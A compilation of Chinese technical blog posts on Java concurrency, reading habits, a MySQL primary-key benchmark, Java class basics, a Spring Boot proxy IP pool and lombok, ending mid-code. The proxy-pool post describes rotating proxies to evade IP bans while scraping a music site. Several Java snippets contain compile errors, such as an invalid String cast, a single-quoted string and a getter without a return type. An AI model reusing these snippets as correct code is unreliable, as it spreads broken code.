/        }
    }

 
 
简单说明一下,AtomicLong是Long和Integer的线程安全holder类,AtommicReference是对象引用的线程安全holder类. 可以保证他们可以原子的set和get.
我们看一下代码,根据lastNumber.get()的结果取返回lastFactors.get()的结果,这里存在竞争条件.因为很有可能线程A执行完lastNumber.set()且还没有执行lastFactors.set()的时候,另一个线程重新调用这个方法进行条件判断,lastNumber.get()取到了最新值,通过判断进行响应,但这时响应的lastFactors.get()却是过期值!!!!
FBI WARNING: 为了保护状态的一致性,要在单一的原子操作中更新相互关联的状态变量.
 
8 内部锁
每个对象都有一个内部锁,执行线程进入synchronized快之前获得锁;而无论通过正常途径退出,还是从块中抛出异常,线程在放弃对synchronized块的控制时自动释放锁.获得内部锁的唯一途径是:进入这个内部锁保护的同步块或方法.
内部锁是互斥锁,意味着至多只有一个线程可以拥有锁,当线程A尝试请求一个被线程B占有的锁时,线程A必须等待或者阻塞,直到B释放它,如果B永远不释放锁,A将永远等待下去
内部锁对提高线程的安全性来说很好,很perfect,but但是,在上锁的时间段其他线程被阻塞了,这会带来糟糕的响应性.
我们再来看之前的单例模式

/**
 * @author liuboren
 * @Title: Singleton
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 16:29
 */
public class Singleton {
    private Singleton singleton;

    private Singleton() {
    }

 /*   public Singleton getSingleton(){
        if(singleton ==null){
            synchronized (this) {
                if (singleton == null) {
                    singleton = new Singleton();
                }
            }
        }
        return singleton;
    }*/

    public synchronized Singleton getSingleton() {
        if (singleton == null) {
            singleton = new Singleton();
        }
        return singleton;
    }
}

 
 
在方法上加synchronized可以保证线程安全,但是响应性不好,上面注解掉的是之前优化后的方法.
 
9 用锁来保护状态
下面列举了一些需要加锁的情况.
1. 操作共享状态的复合操作必须是原子的,以避免竞争条件.例如自增和惰性初始化.
2. 并不是所有数据都需要锁的保护---只有那些被多个线程访问的可变数据.
3. 对于每一个涉及多个变量的不变约束,需要同一个锁保护其所有变量
 
10 活跃度与性能虽然在方法上声明 synchronized可以获得线程安全性,但是响应性变得很感人.
限制并发调用数量的,并非可用的处理器资源,而恰恰是应用程序自身的结构----我们把这种运行方式描述为弱并发的一种表现.
通过缩小synchronized块的范围来维护线程安全性,可以很容易提升代码的并发性,但是不应该把synchronized块设置的过小,而且一些很耗时的操作(例如I/O操作)不应该放在同步块中(容易引发死锁)
决定synchronized块的大小需要权衡各种设计要求,包括安全性、简单性和性能,其中安全性是绝对不能妥协的,而简单性和性能又是互相影响的(将整个方法声明为synchronized很简单,但是性能不太好,将同步块的代码缩小,可能很麻烦,但是性能变好了)
原则:通常简单性与性能之间是相互牵制的,实现一个同步策略时,不要过早地为了性能而牺牲简单性(这是对安全性潜在的妥协).
最后,使用锁的时候,一些耗时非常长的操作,不要放在锁里面,因为线程长时间的占有锁,就会引起活跃度(死锁)与性能风险的问题.
 
嗯,终于写完了.以上是博主<<Java并发编程实战>>的学习笔记,如果对您有帮助的话,请点下推荐,谢谢.
　　 
********************************************************************************************************************************************************************************************************
时间太少，如何阅读？

你有阅读的习惯吗？有自己的阅读框架吗？
...
国庆长假，没有到处跑，闲在家里读读书。看了一下我在豆瓣标记为 “想读” 的书籍已经突破了 300 本，而已标记读过的书才一百多本，感觉是永远读不完了。
好早以前我这个 “想读” 列表是很短的，一般不超过 20 本，因为以前我看见这个列表太长了后，就会主动停止往里面再添加了，直到把它们读完了，这样倒是有助于缓解下这种读不完的压力与焦虑感。
但后来渐渐想明白这个方法其实有很大的弊端，因为这样的处理算法是先进先出的，而更好的选择应该是按优先级队列来的。所以，后来我只要遇到好书，都往列表力放，只是在取的时候再考虑优先级，而不再对队列的长度感到忧虑。
那么从队列中取的时候，优先级算法是如何的呢？这就和每一个人具体的阅读偏好和习惯有关了。而我的阅读习惯简单可以用两个词来概括：聚焦与分层。
我把需要阅读的内容分作 3 个层次：

内层：功利性阅读
中层：兴趣性阅读
外层：探索性阅读

最内层的功利性阅读其实和我们的工作生活息息相关，这样的阅读目的就是为了学会知识或技能，解决一些工作或生活中的问题与困惑。比如，Java 程序员读《Java 核心编程》就属于这类了。
中间层的兴趣性阅读则属于个人兴趣偏好的部分，比如我喜欢读读科幻（今年在重读刘慈欣的各阶段作品）、魔幻（如《冰与火之歌》）和玄幻之类的小说。
最外层的探索性阅读，属于离个人工作和生活比较远的，也没太大兴趣的部分；这部分内容其实就是主动选择走出边界取探索并感受下，也许就可能发现有趣的东西，也可能就有了兴趣。
也许很多人的阅读都有类似的三个层次，但不同的是比例，以及选择的主动与被动性。目前，我在内层功利阅读上的比例最大，占 70%；中层的兴趣阅读约 20%；外层的探索阅读占 10%。这个比例我想不会是固定不变的，只是一定阶段感觉最合适的选择。
有时，招人面试时，最后我总爱问对方：“最近读过什么书？”倒不是真得关心对方读过什么书，其实就是看看有没有阅读的习惯，看看对方是否主动选择去学习和如何有效的处理信息。毕竟阅读的本质就是处理、吸收和消化信息，从读书的选择上可以略窥一二。
让人感叹的是现今能够杀时间的 App 或者节目实在太多，要想真正去认真读点东西对意志力会有些挑战。上面我所说的那个阅读分层，其实都是适用于深度阅读的，它要求你去抵挡一些其他方面的诱惑，把时间花在阅读上。
深度阅读意味着已经完成了内容选择，直接可以进入沉浸式阅读；而在能选择之前，其实就有一个内容收集和沉淀的阶段。平时我都是用碎片时间来完成这个收集和沉淀，为了让这个收集和沉淀发挥的作用更好，其实需要建立更多样化的信息源，以及提升信源的质量。
通过多样化的信源渠道，利用碎片时间广度遍历，收集并沉淀内容；再留出固有的时间，聚焦选择分层阅读内容，进入沉浸阅读；这样一个系统化的阅读习惯就建立起来了，剩下的就交给时间去慢慢积累吧。
...
我的阅读只有一个框架，并没有计划；只管读完当前一本书，下一本书读什么，什么时候读都不知道，只有到要去选择那一刻才会根据当时的状态来决定。
但框架指导了我的选择。

写点文字，画点画儿，记录成长瞬间。
微信公众号「瞬息之间」，既然遇见，不如同行。


********************************************************************************************************************************************************************************************************
【数据库】Mysql中主键的几种表设计组合的实际应用效果
写在前面
        前前后后忙忙碌碌，度过了新工作的三个月。博客许久未新，似乎对忙碌没有一点点防备。总结下来三个月不断的磨砺自己，努力从独乐乐转变到众乐乐，体会到不一样的是，连办公室的新玩意都能引起莫名的兴趣了，作为一只忙碌的 “猿” 倒不知正常与否。
        咳咳， 正题， 今天要写一篇关于mysql的主键、索引的文章，mysql的研究博主进行还不够深入，今天讨论的主题主要是，主键对增删改查的具体影响是什么？ 博主将用具体的实验说明。
         如果你不了解主键，你可以先看看下面的小节，否则你可以直接跳转到实验步骤
了解主键、外键、索引
主键
　　主键的主要作用是保证表的完整、保证表数据行的唯一性质，
     ① 业务主键（自然主键）：在数据库表中把具有业务逻辑含义的字段作为主键，称为“自然主键(Natural Key)”。
   自然主键的含义就是原始数据中存在的不重复字段，直接使用成为主键字段。 这种方式对业务的耦合太强，一般不会使用。
 
     ② 逻辑主键（代理主键）：在数据库表中采用一个与当前表中逻辑信息无关的字段作为其主键，称为“代理主键”。
          逻辑主键提供了一个与当前表数据逻辑无关的字段作为主键，逻辑主键被广泛使用在业务表、数据表，一般有几种生成方式：uuid、自增。其中使用最多的是自增，逻辑主键成功的避免了主键与数据表关联耦合的问题，与业务主键不同的是，业务主键的数据一旦发生更改，那么那个系统中关于主键的所有信息都需要连带修改，这是不可避免的，并且这个更改是随业务需求的增量而不断的增加、膨胀。而逻辑主键与应用耦合度低，它与数据无任何必要的关系，你可以只关心：第一条数据； 而不用关心： 名字是a的那条数据。  某一天名字改成b， 你还是只关心：第一条数据。
         业务的更改几乎是不可避免的，前期任何产品经理言之凿凿的不修改论调都是不可靠、不切实际的。我们必须考虑主键数据在更改的情况下，数据能否平稳度过危机。
 
     ② 复合主键（联合主键）：通过两个或者多个字段的组合作为主键。
    复合主键可以说是业务主键的升级版本，通常一个业务字段不能够确定一条数据的唯一性，例如 张三的身份证是34123322， 张三这种大众名称100%会出现重复。我们可以用姓名 + 身份证的方式表示主键，声明一个唯一的记录。
    有时候，复合主键是复杂的。 姓名+身份证 不一定能表示不重复，虽然身份证在17年消除了重复的问题，但是之前的数据呢？ 可能我们需要新增一个地址作为联合主键，例如 姓名 + 身份证 + 联系地址确认一个人的身份。在其他的业务中，例如访问控制，用户 + 终端 + 终端类型 + 站点 + 页面 + 时间，可能六个字段的联合才能够去确定一个字段的唯一性，这另复杂度陡升。
    另外如果其他表要与该表关联则需要引用复合主键的所有字段，这就不单纯是性能问题了，还有存储空间的问题了，当然你也可以认为这是合理的数据冗余，方便查询，但是感觉有点得不偿失。
 
 　　　使用复合主键的原因可能是：对于关系表来说必须关联两个实体表的主键，才能表示它们之间的关系，那么可以把这两个主键联合组成复合主键即可。
 
 　　　如果两个实体存在多个关系，可以再加一个顺序字段联合组成复合主键，但是这样就会引入业务主键的弊端。当然也可以另外对这个关系表添加一个逻辑主键，避免了业务主键的弊端，同时也方便其他表对它的引用。
 
 
外键
       外键是一种约束，表与表的关联约束，例如a表依赖关联b表的某个字段，你可以设置a表字段外键关联到b表的字段，将两张表强制关联起来，这时候产生两个效果
               ① 表 b 无法被删除，你必须先删除a表
               ② 新增的数据必须与表b某行关联
       这对某些需要强耦合的业务操作来说很有必要，但、 要强调但是，外键约束我认为，不可滥用，没有合适的理由支撑它的使用的话，将导致业务强制耦合。另外对开发人员不够友好。使用外键一定不能超过3表相互。否则将引出很多的麻烦而不得不取消外键。
索引
      索引用于快速找出在某个列中有一特定值的行，不使用索引，MySQL必须从第一条记录开始读完整个表，直到找出相关的行，表越大，查询数据所花费的时间就越多，如果表中查询的列有一个索引，MySQL能够快速到达一个位置去搜索数据文件，而不必查看所有数据，那么将会节省很大一部分时间。
　　例如：有一张person表，其中有2W条记录，记录着2W个人的信息。有一个Phone的字段记录每个人的电话号码，现在想要查询出电话号码为xxxx的人的信息。
　　如果没有索引，那么将从表中第一条记录一条条往下遍历，直到找到该条信息为止。
　　如果有了索引，那么会将该Phone字段，通过一定的方法进行存储，好让查询该字段上的信息时，能够快速找到对应的数据，而不必在遍历2W条数据了。其中MySQL中的索引的存储类型有两种BTREE、HASH。 也就是用树或者Hash值来存储该字段，要知道其中详细是如何查找的，就需要会算法的知识了。我们现在只需要知道索引的作用，功能是什么就行。
        优点：
　　　　1、所有的MySql列类型(字段类型)都可以被索引，也就是可以给任意字段设置索引
　　　　2、大大加快数据的查询速度
　　缺点：
　　　　1、创建索引和维护索引要耗费时间，并且随着数据量的增加所耗费的时间也会增加
　　　　2、索引也需要占空间，我们知道数据表中的数据也会有最大上线设置的，如果我们有大量的索引，索引文件可能会比数据文件更快达到上线值
　　　　3、当对表中的数据进行增加、删除、修改时，索引也需要动态的维护，降低了数据的维护速度。
　　使用原则：
　　　 索引需要合理的使用。
　　　　1、对经常更新的表就避免对其进行过多的索引，对经常用于查询的字段应该创建索引，
　　　　2、数据量小的表最好不要使用索引，因为由于数据较少，可能查询全部数据花费的时间比遍历索引的时间还要短，索引就可能不会产生优化效果。
　　　　3、在一同值少的列上(字段上)不要建立索引，比如在学生表的"性别"字段上只有男，女两个不同值。相反的，在一个字段上不同值较多可是建立索引。
 
测试主键的影响力
       为了说明业务主键、逻辑主键、复合主键对数据表的影响力，博主使用java生成四组测试数据，首先准备表结构为：
       

  `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT,  -- 自增
  `dt` varchar(40) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,     -- 使用uuid模拟不同的id
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,  -- 随机名称
  `age` int(10) NULL DEFAULT NULL,   -- 随机数生成年龄
  `key` varchar(40) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,  -- 唯一标识 使用uuid测试
  PRIMARY KEY (`id`) USING BTREE -- 设置主键


　　将生成四组千万条的数据： 
        1. 自增主键   test_primary_a 
        2. 自增主键  有索引 test_primary_d 
        3. 无主键 无索引 test_primary_b 
        4. 复合主键 无索引 test_primary_c 
       使用java, spring boot + mybatis每次批量一万条数据，插入一千次，记录每次插入时间，总插入时间：
     　mybatis代码：
         

<insert id="insertTestData">
        insert into test_primary_${code} (
        `dt`,
        `name`,
        `age`,
        `key`
        ) values
        <foreach collection="items" item="item"  index= "index" separator =",">
            (
            #{item.dt},
            #{item.name},
            #{item.age},
            #{item.key}
            )
        </foreach>

        java代码，使用了mybatis插件提供的事务处理：

@Transactional(readOnly = false)
   public Object testPrimary (String type) {
       HashMap result = new HashMap();
       // 记录总耗时 开始时间
       long start = new Date().getTime();
       // 记录总耗时 插入条数
       int len = 0;
       try{
           String[] names = {"赵一", "钱二", "张三" , "李四", "王五", "宋六", "陈七", "孙八", "欧阳九" , "徐10"};
           for (int w = 0; w < 1000; w++) {
               // 记录万条耗时
               long startMil = new Date().getTime();

               ArrayList<HashMap> items = new ArrayList<>();
               for (int i = 0; i < 10000; i++) {
                   String dt = StringUtils.uuid();
                   String key = StringUtils.uuid();
                   int age = (int)((Math.random() * 9 + 1) * 10); // 随机两位
                   String name = names[(int)(Math.random() * 9 + 1)];
                   HashMap item = new HashMap<>();
                   item.put("dt", dt);
                   item.put("key", key);
                   item.put("age", age);
                   item.put("name", name);
                   items.add(item);
               }
               len += tspTagbodyMapper.insertTestData(items, type);
               long endMil = new Date().getTime();
               // 万条最终耗时
               result.put(w, endMil - startMil);
           }
           long end = new Date().getTime();
           // 总耗时
           result.put("all", end - start);
           result.put("len", len);
           return result;
       } catch (Exception e) {
           System.out.println(e.toString());
           result.put("e", e.toString());
       }
       return result;
   }

最终生成的数据表情况：
      
        1. 自增主键   test_primary_a  ----------  数据长度  960MB
             62分钟插入一千万条数据  平均一万条数据插入 4秒
 
        2. 自增主键  有索引 test_primary_d    数据长度  1GB    索引长度  1.36GB
            75分钟插入一千万条数据  平均一万条数据插入 4.5秒
 
        3. 无主键 无索引 test_primary_b   -----------   数据长度  960MB
             65分钟插入一千万条数据  平均一万条数据插入 4.2秒
 
        4. 复合主键 无索引 test_primary_c    -----------   数据长度  1.54GB
             219分钟插入一千万条数据 平均一万条数据插入 8秒， 这里有一个问题， 复合主键的数据插入耗时是线性增长的，当数据小于100万 插入时常在五秒左右， 当数据变大，插入时长无限变大，在1000万条数据时，平均插入一万数据秒数已经达到15秒了。
        
 
 查询速度
         注意索引的建立时以name字段为开头，索引的生效第一个条件必须是name
         简单查询：
         select name,age from test_primary_a where age=20   -- 自增主键 无索引 结果条数11万 平均3.5秒
         select name,age from test_primary_a where name='张三' and age=20   -- 自增主键 有索引 结果条数11万 平均650豪秒
         select name,age from test_primary_b where age=20   -- 无主键 无索引 结果条数11万 平均7秒
         select name,age from test_primary_c where age=20    -- 联合主键 无索引 结果条数11万 平均4.5秒
　　　
 
         稍复杂条件：
 
         select name,age,`key`,dt from test_primary_a where age=20 and (name='王五' or name = '张三') and dt like '%abc%'      -- 自增主键 无索引 结果条数198 平均4.2秒
　　  select dt,name,age,`key` from test_primary_d where  (name='王五' or name = '张三') and age=20 and dt like '%abc%'      -- 自增主键 有索引 结果条数204 平均650豪秒
         select name,age,`key`,dt from test_primary_d where age=20 and (name='王五' or name = '张三') and dt like '%abc%'      -- 无主键 无索引 结果条数194 平均5.9秒
         select name,age,`key`,dt from test_primary_c where age=20 and (name='王五' or name = '张三') and dt like '%abc%'      -- 联合主键 无索引 结果条数11万 平均5秒
　　 这样的语句更夸张一点：
         select name,age,dt from test_primary_c where dt like '%0000%' and name='张三'        -- 联合主键 无索引 结果条数359 平均8秒
          select name,age,dt from test_primary_c where dt like '%0000%' and name='张三'        -- 自增主键 有索引 结果条数400 平均1秒
　　　
 
 
初步结论
      从实际应用中可以看出：用各主键的对比，在导入速度上，在前期百万数据时，各表表现一致，在百万数据以后，复合主键的新增时长将线性增长，应该是因为每一条新增都需要判断是否重复，而数据量一旦增大，每次新增都需要全表筛查。
      另外一点，逻辑主键 + 索引的方式占用空间一共2.4G， 复合主键占用1.54G 相差大约1个G ， 但是实际查询效果看起来索引更胜一筹，只要查询方法得当，索引应该是当前的首选。
      最后，关于复合主键的作用？ 我想应该是在业务主键字段不超过2-3个的情况下，需要确保数据维度的唯一性，采取复合主键加上限制。
写在最后
       前后耗时一整天，完成了这次实验过程，目的就是检验几种表设计组合的实际应用效果，关于其他的问题，博主将在后续持续跟进。
        实践出真知。
 
 
********************************************************************************************************************************************************************************************************
类与对象 - Java学习（二）
弄清楚类与对象的本质与基本特征，是进一步学习面向对象编程语言的基本要求。面向对象程序设计与面向过程程序设计在思维上存在着很大差别，改变一种思维方式并不是一件容易的事情。
一、面向对象程序设计
程序由对象组成，对象包含对用户公开的特定功能部分，和隐藏在其内部的实现部分。从设计层面讲，我们只关心对象能否满足要求，而无需过多关注其功能的具体实现。面对规模较小的问题时，面向过程的开发方式是比较理想的，但面对解决规模较大的问题时，面向对象的程序设计往往更加合适。
类
对象是对客观事物的抽象，类是对对象的抽象，是构建对象的模板。由类构造（construct）对象的过程称为创建类的实例（instance）或类的实例化。
封装是将数据和行为组合在一个包中，并对使用者隐藏数据的实现方式。对象中的数据称为实例域（instance field）或属性、成员变量，操纵数据的过程称为方法（method）。对象一般有一组特定的实例域值，这些值的集合就是对象当前的状态。封装的关键在于不让类中的方法直接的访问其他类的实例域，程序仅通过对象的方法与对象数据进行交互。封装能够让我们通过简单的使用一个类的接口即可完成相当复杂的任务，而无需了解具体的细节实现。
对象的三个主要特征

对象的行为（behavior）：可以对对象施加哪些操作，通过方法（method）实现。
对象的状态（state）：存储对象的特征信息，通过实例域（instance field）实现。
对象的标识（identity）：辨别具有不同行为与状态的不同对象。

设计类
传统的面向过程的程序设计，必须从顶部的 main 入口函数开始编写程序。面向对象程序设计没有所谓的顶部，我们要从设计类开始，然后再往每个类中添加方法。那么我们该具体定义什么样的类？定义多少个？每个类又该具备哪些方法呢？这里有一个简单的规则可以参考 —— “找名词与动词”原则。
我们需要在分析问题的过程中寻找名词和动词，这些名词很有可能成为类，而方法对应着动词。当然，所谓原则，只是一种经验，在创建类的时候，哪些名词和动词是重要的，完全取决于个人的开发经验（抽象能力）。
类之间的关系
最常见的关系有：依赖（use-a）、聚合（has-a)、继承（is-a)。可以使用UML（unified modeling language）绘制类图，用来可视化的描述类之间的关系。
二、预定义类与自定义类
在 Java 中没有类就无法做任何事情，Java 标准类库中提供了很多类，这里称其为预定义类，如 Math 类。要注意的是：并非所有类都具有面向对象的特征（如 Math 类），它只封装了功能，不需要也不必要隐藏数据，由于没有数据，因此也不必担心生成以及初始化实例域的相关操作。
要使用对象，就必须先构造对象，并指定其初始状态。我们可以使用构造器（constructor）构造新实例，本质上，构造器是一种特殊的方法，用以构造并初始化对象。构造器的名字与类名相同。如需构造一个类的对象，需要在构造器前面加上 new 操作符，如new Date()。通常，希望对象可以多次使用，因此，需要将对象存放在一个变量中,不过要注意，一个对象变量并没有实际包含一个对象，而仅仅是引用一个对象。
访问器与修改器 我们把只访问对象而不修改对象状态的方法称为 访问器方法（accessor method）。如果方法会对对象本身进行修改，我们称这样的方法称为 更改器方法（mutator method）。
用户自定义类
要想创建一个完成的程序，应该将若干类组合在一起，其中只有一个类有 main 方法。其它类（ workhorse class）没有 main 方法，却有自己的实例域和实例方法，这些类往往需要我们自己设计和定义。
一个源文件中，最多只能有一个公有类（访问级别为public），但可以有任意数目的非公有类。尽管一个源文件可以包含多个类，但还是建议将每一个类存在一个单独的源文件中。 不提倡用public标记实例域（即对象的属性），public 数据域允许程序中的任何方法对其进行读取和修改。当实例域设置为 private 后，如果需要对其进行读取和修改，可以通过定义公有的域访问器或修改器来实现。这里要注意：不要编写返回引用可变对象的访问器方法，如：
class TestClass{
    private Date theDate;
    public getDate(){
        return theDate; // Bad
    }
}
上面的访问器返回的是对实例属性 theDate 的引用，这导致在后续可以随意修改当前实例的 theDate 属性，比如执行x.getDate().setTime(y)，破坏了封装性！如果要返回一个可变对象的引用，应该首先对他进行克隆，如下：
class TestClass{
    private Date theDate;
    public getDate(){
        return (Date) theDate.clone(); // Ok
    }
}
构造器
构造器与类同名，当实例化某个类时，构造器会被执行，以便将实例域初始化为所需的状态。构造器总是伴随着 new 操作符的调用被执行，不能对一个已经存在的对象调用构造器来重置实例域。

构造器与类同名
每个类可以有多个构造器
构造器可以有 0 个或多个参数
构造器没有返回值
构造器总是伴随着 new 操作一起调用

基于类的访问权限
方法可以访问所属类的所有对象的私有数据。[*]
在实现一个类时，应将所有的数据域都设置为私有的。多数时候我们把方法设计为公有的，但有时我们希望将一个方法划分成若干个独立的辅助方法，通常这些辅助方法不应该设计成为公有接口的一部分，最好将其标记为 private 。只要方法是私有的，类的设计者就可以确信：他不会被外部的其他类操作调用，可以将其删去，如果是公有的，就不能将其删除，因为其他的代码可能依赖它。
final 实例域
在构建对象时必须对声明的 final 实例域进行初始化，就是说必须确保在构造器执行之后，这个域的值被设置，并且在后面的操作中，不能够再对其进行修改。final 修饰符大都用于基本类型，或不可变类的域。
静态域和静态方法
静态域和静态方法，是属于类且不属于对象的变量和函数。
通过 static 修饰符，可以标注一个域为静态的，静态域属于类，而不属于任何独立的对象，但是每个对象都会有一份这个静态域的拷贝。静态方法是一种不能对对象施加操作的方法，它可以访问自身类的静态域，类的对象也可以调用类的静态方法，但更建议直接使用类名调用静态方法。
使用静态方法的场景 : 一个方法不需要访问对象状态，其所需参数都是通过显式参数提供；一个方法只需要访问类的静态域。
静态方法还有另外一种常见用途，作为工厂方法用以构造对象。之所已使用工厂方法，两个原因：一是无法命名构造器，因为构造器必须与类名相同；二是当时用构造器时无法改变构造的对象类型。
程序入口 main 方法就是一个典型的静态方法，其不对任何对象进行操作。在启动程序时还没有任何一个对象，静态的 main 方法将执行并创建程序所需要的对象。每个类都可以有一个 main 方法，作为一个小技巧，我们可以通过这个方法对类进行单元测试。
三、方法参数
Java 中的方法参数总是按值调用，也就是说，方法得到的是所有参数的值的一个拷贝，特别是，方法不能修改传递给它的任何参数变量的内容。然而，方法参数有两种类型：基本数据类型和对象引用。
四、对象构造
如果在构造器中没有显式的为域赋值，那么域会被自动的赋予默认值：数值为 0、布尔之为 false、对象引用为 null。在类没有提供任何构造器的时候，系统会提供一个默认的构造器。
有些类有多个构造器，这种特征叫做重载（overloading）。如果多个方法有相同的名字、不同的参数，便产生了重载。 Java 中允许重载任何方法，而不仅是构造器方法。要完整的描述一个方法，需要指出方法名以及其参数类型，这个描述被称作方法的签名。
通过重载类的构造器方法，可以采用多种形式设置类的实例的初始状态。当存在多个构造器的时候，也可以在构造器内部通过 this 调用另一个构造器，要注意的是这个调用必须在当前构造器的第一行：
class Test{
    Test(int number) {
        this(number, (String)number);   // 位于当前构造器的第一行
    }

    Test(int number, String str) {
        _number = number;
        _string = str;
    }
}
初始化块
在一个类的声明中，可以包含多个代码块。只要构造类的对象，这些块就会被执行。例如：
class Test{
    private int number;
    private String name;

    /**
     * 初始化块
     */
    {
        number = 5;
    }

    Test(){
        name = 'Kelsen'
    }

    public void pring(){
        System.out.println(name + "-" + number);
    }
}
执行顺序为，首先运行初始化块，然后再运行构造器的主体部分。这种机制不是必须的，也不常见。通常会直接将初始化代码放在构造器中。
Java 中不支持析构器，它有自动的垃圾回收器，不需要人工进行内存回收。但，如果某个资源需要在使用完毕后立刻被关闭，那么就需要人工来管理。对象用完时可以应用一个 close 方法来完成相应的清理操作。
五、包
借助于包，可以方便的组织我们的类代码，并将自己的代码与别人提供的代码库区分管理。标准的 Java 类库分布在多个包中，包括 java.lang、java.util 和 java.net 等。标准的 Java 包具有一个层次结构。如同硬盘文件目录嵌套一样，也可以使用嵌套层次组织包。所有的标准 Java 包都处于 java 和 javax 包层次中。从编译器角度看，嵌套的包之间没有任何关系，每一个都拥有独立的类集合。
一个类可以使用所属包中的所有类，以及其他包中的公有类（pbulic class）。 import 语句是一种引用包含在包中的类的简明描述。package 与 import 语句类似 C++ 中的 namespace 和 using 指令。
import 语句还可以用来导入类的静态方法和静态域。
如果要将一个类放入包中，就必须将包的名字放在源文件的开头，包中定义类的代码之前。如：

package com.kelsem.learnjava;

public class Test{
    // ...
}
如果没有在源文件中放置 package 语句，这个源文件中的类就被放置在一个默认包中。
包作用域
标记为 private 的部分只能被定义他们的类访问，标记为 public 的部分可以被任何类访问；如果没有指定访问级别，这个部分（类/方法/变量）可以被同一个包中的所有方法访问。
类路径
类存储在文件系统的目录中，路径与包名匹配。另外，类文件也可以存储在 JAR 文件中。为了使类能够被多个程序共享，通常把类放到一个目录中，将 JAR 文件放到一个目录中，然后设置类路径。类路径是所有包含类文件的路径的集合，设置类路径时，首选使用 -calsspath 选项设置，不建议通过设置 CLASSPATH 这个环境变量完成该操作。
六、文档注释
JDK 包含一个非常有用的工具，叫做 javadoc 。它通过分析我们的代码文件注释，自动生成 HTML 文档。每次修源码后，通过运行 javadoc 就可以轻松更新代码文档。Javadoc 功能包括：Javadoc搜索，支持生成HTML5输出，支持模块系统中的文档注释，以及简化的Doclet API。详细使用说明可参考 https://docs.oracle.com/en/java/javase/11/javadoc/javadoc.html
七、类的设计
一定要保证数据私有 务必确保封装性不被破坏。
一定要对数据初始化 Java 不会对局部变量进行初始化，但会对对象的实例域进行初始化。最好不要依赖于系统默认值，而是显式的对实例域进行初始化。
不要在类中使用过多的基本类型 通过定义一个新的类，来代替多个相关的基本类型的使用。
不是所有的域都需要独立的域访问器和域更改器
将职责过多的类进行分解 如果明显的可以将一个复杂的类分解为两个更简单的类，就应该将其分解。
类名和方法名要能够体现他们的职责 对于方法名，建议：访问器以小写 get 开头，修改器以小写 set 开头；对于类名，建议类名是采用一个名词（Order）、前面有形容词修饰的名词(RushOrder)或动名词(ing后缀)修饰名词（BillingAddress）。
优先使用不可变的类 要尽可能让类是不可变的，当然，也并不是所有类都应当是不可变的。

********************************************************************************************************************************************************************************************************
springboot实现java代理IP池 Proxy Pool，提供可用率达到95%以上的代理IP
 
一、背景
前段时间，写java爬虫来爬网易云音乐的评论。不料，爬了一段时间后ip被封禁了。由此，想到了使用ip代理，但是找了很多的ip代理网站，很少有可以用的代理ip。于是，抱着边学习的心态，自己开发了一个代理ip池。
 
二、相关技术及环境
技术： SpringBoot，SpringMVC, Hibernate, MySQL, Redis , Maven, Lombok, BootStrap-table，多线程并发环境： JDK1.8 , IDEA
 
三、实现功能
通过ip代理池，提供高可用的代理ip,可用率达到95%以上。

通过接口获取代理ip 通过访问接口，如：http://127.0.0.1:8080/proxyIp 返回代理ip的json格式







　

{
    "code":200,
    "data":[
        {
            "available":true,
            "ip":"1.10.186.214",
            "lastValidateTime":"2018-09-25 20:31:52",
            "location":"THThailand",
            "port":57677,
            "requestTime":0,
            "responseTime":0,
            "type":"https",
            "useTime":3671
        }
    ],
    "message":"success"
}


　　

通过页面获取代理ip 通过访问url，如：http://127.0.0.1:8080 返回代理ip列表页面。



提供代理ip测试接口及页面 通过访问url, 如：http://127.0.0.1:8080/test （get）测试代理ip的可用性；通过接口 http://127.0.0.1:8080/test ]（post data: {"ip": "127.0.0.1","port":8080} ） 测试代理ip的可用性。

 
四、设计思路
     4.1 模块划分



爬虫模块：爬取代理ip网站的代理IP信息，先通过队列再保存进数据库。
数据库同步模块：设置一定时间间隔同步数据库IP到redis缓存中。
缓存redis同步模块：设置一定时间间隔同步redis缓存到另一块redis缓存中。
缓存redis代理ip校验模块：设置一定时间间隔redis缓存代理ip池校验。
前端显示及接口控制模块：显示可用ip页面，及提供ip获取api接口。



     4.2 架构图

五、IP来源
代理ip均来自爬虫爬取，有些国内爬取的ip大多都不能用，代理池的ip可用ip大多是国外的ip。爬取的网站有：http://www.xicidaili.com/nn ，http://www.data5u.com/free/index.shtml ，https://free-proxy-list.net ，https://www.my-proxy.com/free-proxy-list.html ，http://spys.one/en/free-proxy-list/ ， https://www.proxynova.com/proxy-server-list/ ，https://www.proxy4free.com/list/webproxy1.html ，http://www.gatherproxy.com/ 。
六、如何使用
前提： 已经安装JDK1.8环境，MySQL数据库，Redis。先使用maven编译成jar,proxy-pool-1.0.jar。使用SpringBoot启动方式，启动即可。


java -jar proxy-pool-1.0.jar


 
实际使用当ip代理池中可用ip低于3000个，可用率在95%以上；当代理池中ip数量增加到5000甚至更多，可用率会变低（因为开启的校验线程数不够多）
有什么使用的问题欢迎回复。。。
本文代码已经提交github：https://github.com/chenerzhu/proxy-pool  欢迎下载。。。
 
 


********************************************************************************************************************************************************************************************************
lombok踩坑与思考
虽然接触到lombok已经有很长时间，但是大量使用lombok以减少代码编写还是在新团队编写新代码维护老代码中遇到的。
我个人并不主张使用lombok，其带来的代价足以抵消其便利，但是由于团队编码风格需要一致，用还是要继续使用下去。使用期间遇到了一些问题并进行了一番研究和思考，记录一下。
1. 一些杂七杂八的问题
这些是最初我不喜欢lombok的原因。
1.1 额外的环境配置
作为IDE插件+jar包，需要对IDE进行一系列的配置。目前在idea中配置还算简单，几年前在eclipse下也配置过，会复杂不少。
1.2 传染性
一般来说，对外打的jar包最好尽可能地减少三方包依赖，这样可以加快编译速度，也能减少版本冲突。一旦在resource包里用了lombok，别人想看源码也不得不装插件。
而这种不在对外jar包中使用lombok仅仅是约定俗成，当某一天lombok第一次被引入这个jar包时，新的感染者无法避免。
1.3 降低代码可读性
定位方法调用时，对于自动生成的代码，getter/setter还好说，找到成员变量后find usages，再根据上下文区分是哪种；equals()这种，想找就只能写段测试代码再去find usages了。
目前主流ide基本都支持自动生成getter/setter代码，和lombok注解相比不过一次键入还是一次快捷键的区别，实际减轻的工作量十分微小。
2. @EqualsAndHashCode和equals()
2.1 原理
当这个注解设置callSuper=true时，会调用父类的equlas()方法，对应编译后class文件代码片段如下：
public boolean equals(Object o) {
    if (o == this) {
        return true;
    } else if (!(o instanceof BaseVO)) {
        return false;
    } else {
